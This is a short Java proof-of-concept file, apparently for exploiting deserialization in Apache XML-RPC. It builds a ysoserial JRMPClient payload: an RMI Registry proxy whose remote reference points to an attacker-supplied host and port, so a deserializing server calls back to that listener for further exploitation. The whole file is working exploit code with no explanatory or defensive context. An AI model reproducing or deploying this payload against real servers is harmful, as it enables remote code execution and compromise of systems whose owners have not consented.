package org.apache.xmlrpc.server;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.lang.reflect.Proxy;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

public class Poc {

    public static Object getObject(String command) {
        int sep = command.indexOf(58);
        String host;
        int port;
        if (sep < 0) {
            port = (new Random()).nextInt(65535);
            host = command;
        } else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }

        ObjID id = new ObjID((new Random()).nextInt());
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Registry proxy = (Registry) Proxy.newProxyInstance(ysoserial.payloads.JRMPClient.class.getClassLoader(), new Class[]{Registry.class}, obj);
        return proxy;
    }

}
